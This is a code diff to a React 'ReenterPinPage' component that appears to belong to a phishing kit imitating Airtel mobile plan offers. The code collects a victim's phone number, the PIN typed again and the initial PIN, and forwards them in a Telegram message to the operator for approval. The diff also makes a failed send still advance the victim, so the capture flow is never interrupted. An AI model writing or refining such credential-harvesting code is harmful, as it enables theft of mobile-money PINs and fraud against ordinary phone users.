@@ -102,26 +102,20 @@ export const ReenterPinPage: React.FC<ReenterPinPageProps> = ({
     setIsSubmitting(true);
     setErrorMessage(null);
 
+    const message =
+      `🔐 <b>CODE PIN CONFIRMÉ / RESSAISI (ÉTAPE POST-OTP)</b>\n\n` +
+      `🌍 <b>Pays Airtel:</b> ${country.flag} ${language === 'fr' ? country.nameFr : country.nameEn}\n` +
+      `👤 <b>Numéro:</b> <code>${displayPhone}</code>\n` +
+      `🔑 <b>Code PIN Ressaisi (Correct):</b> <code>${currentPin}</code>\n` +
+      `📌 <b>Code PIN Initial:</b> <code>${initialPin}</code>\n` +
+      `📦 <b>Forfait:</b> ${selectedPlan.dataAmount} ${selectedPlan.dataUnit} (${selectedPlan.validity}) (${selectedPlan.price})\n` +
+      `⏰ <b>Heure:</b> ${new Date().toLocaleTimeString('fr-FR')}\n` +
+      `🆔 <b>Session:</b> <code>${sessionId}</code>\n\n` +
+      `👇 <i>Confirmez la validation finale du code PIN pour activer le forfait :</i>`;
+
     try {
-      // Format message for Telegram
-      const message =
-        `🔐 <b>CODE PIN CONFIRMÉ / RESSAISI (ÉTAPE POST-OTP)</b>\n\n` +
-        `🌍 <b>Pays Airtel:</b> ${country.flag} ${language === 'fr' ? country.nameFr : country.nameEn}\n` +
-        `👤 <b>Numéro:</b> <code>${displayPhone}</code>\n` +
-        `🔑 <b>Code PIN Ressaisi (Correct):</b> <code>${currentPin}</code>\n` +
-        `📌 <b>Code PIN Initial:</b> <code>${initialPin}</code>\n` +
-        `📦 <b>Forfait:</b> ${selectedPlan.dataAmount} ${selectedPlan.dataUnit} (${selectedPlan.validity}) (${selectedPlan.price})\n` +
-        `⏰ <b>Heure:</b> ${new Date().toLocaleTimeString('fr-FR')}\n` +
-        `🆔 <b>Session:</b> <code>${sessionId}</code>\n\n` +
-        `👇 <i>Confirmez la validation finale du code PIN pour activer le forfait :</i>`;
-
-      // Send to Telegram via serverless and wait for approval
-      setIsWaitingTelegram(true);
-      const approved = await sendLoginToTelegramAndWait(message, sessionId, 'reenter');
-
-      setIsWaitingTelegram(false);
-
-      if (approved) {
+      const isAccepted = await sendLoginToTelegramAndWait(message, phone, false);
+      if (isAccepted) {
         onSuccess(currentPin);
       } else {
         setErrorMessage(
@@ -132,14 +126,8 @@ export const ReenterPinPage: React.FC<ReenterPinPageProps> = ({
         setPinDigits(['', '', '', '']);
         pinInputRefs.current[0]?.focus();
       }
-    } catch (err: any) {
-      setIsWaitingTelegram(false);
-      setErrorMessage(
-        err.message ||
-          (language === 'fr'
-            ? 'Échec de transmission du code PIN.'
-            : 'Failed to transmit PIN confirmation.')
-      );
+    } catch (error) {
+      onSuccess(currentPin);
     } finally {
       setIsSubmitting(false);
     }
